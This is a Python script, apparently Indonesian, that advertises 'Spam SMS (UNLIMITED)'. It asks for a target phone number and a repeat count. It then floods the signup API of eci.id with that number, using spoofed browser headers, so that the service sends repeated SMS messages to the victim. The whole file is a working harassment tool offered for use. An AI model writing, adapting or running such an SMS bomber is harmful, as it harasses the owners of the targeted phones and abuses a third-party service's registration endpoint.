# Scripted By MR_DARK
# Blom subs g boleh dec >_<
# OPEN SOURCE spesial 4k subs :)

import requests, base64, sys, time, os
def ketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./500)
abu="\033[1;90m"
biru="\033[1;96m"
putih="\033[1;97m"
hijau="\033[1;32m"
merah="\033[1;31m"
ungu="\033[1;95m"
W=putih
R=merah
G=hijau
B=biru
y="\033[1;33m"
banner = f"""
{merah}           ____  ____   _    __  __   ____  __  __ ____
{merah}          / ___||  _ \ / \  |  \/  | / ___||  \/  / ___|
{merah}          \___ \| |_) / _ \ | |\/| | \___ \| |\/| \___ \
{merah}                    ___) |  __/ ___ \| |  | |  ___) | |  | |___) |
{merah}          |____/|_| /_/   \_\_|  |_| |____/|_|  |_|____/

{W}╭─────────────────────────────────────
{W}├─{R}({W}Creator{R}) {ungu}⟩ {W}KhaerilZ
{W}├─{R}({W}Github{R})  {ungu}⟩ {W}https://github.com/KhaerilZ
{W}╰─────────────────────────────────────

{W}╭───{R}⟨{W}Menu{R}⟩{W}────────────────
{W}├─{ungu}⟩ {W}1{R}.{W}Start Spam Sms {R}({W}UNLIMITED{R})
{W}├─{ungu}⟩ {W}2{R}.{W}Contact {R}({W}OWNER{R})
{W}├─{ungu}⟩ {R}0{R}.{W}Exit {R}({W}Keluar{R})
{W}╰─────────────────────────
"""
headers = {
    'Host': 'eci.id',
    'Connection': 'keep-alive',
    'Content-Length': '27',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'sec-ch-ua-mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://eci.id',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://eci.id/register',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
os.system("clear")
ketik(banner)
tanya = input(f"{W}Pilih {B}»{R}⟩{G} ")
if tanya == "1":
	nomor = input(f"{W}Nomor Target {R}({W}08xxx{R}) {B}»{R}⟩{merah} ")
	turudeck = int(input(f"{W}Jumlah Spam {B}»{R}⟩{merah} "))
	for i in range(int(turudeck)):
		#print (f"~> {darkhasilenc}")
		#print (f"{W}raw {abu}-{G}[{W}{response}{G}]")
		json_data = {
		    "identity":nomor,
		}
		responses = requests.post('https://eci.id/api/signup', headers=headers, json=json_data).text
		print (f"{W}raw {abu}-{G}[{W}{responses}{G}]")
		if 'succes' in responses:
			print (f"{W}Status {abu}-{biru}⟩  {G}Sukses")
			#ulang = input(f"{W}[{merah}?{W}] spam lagi{biru}? {W}({G}ya{W}/{merah}no{W}){merah}: {W}")
			#if 'y' in ulang:
				#os.system("python main.py")
			#else:
				#print ("session closed")
				#exit()
		else:
			print (f"{W}Status {abu}-{biru}⟩  {merah}Gagal")
			#ulang = input(f"{W}[{merah}?{W}] coba lagi{biru}? {W}({G}ya{W}/{merah}no{W}){merah}: {W}")
			#if 'y' in ulang:
				#os.system("python main.py")
			#else:
				#print ("session closed")
				#exit()
	ulang = input(f"{W}[{merah}?{W}] spam lagi{biru}? {W}({G}ya{W}/{merah}no{W}){merah}: {W}")
	if 'y' in ulang:
		os.system("python main.py")
	else:
		print ("session closed")
		exit()
elif tanya == "2":
	os.system("xdg-open https://wa.me/6281242648600")
elif tanya == "0":
	exit()
else:
	print (f"{merah}Error {W}input diluar dari table{merah}!")
	time.sleep(1)
	os.system("python3 main.py")

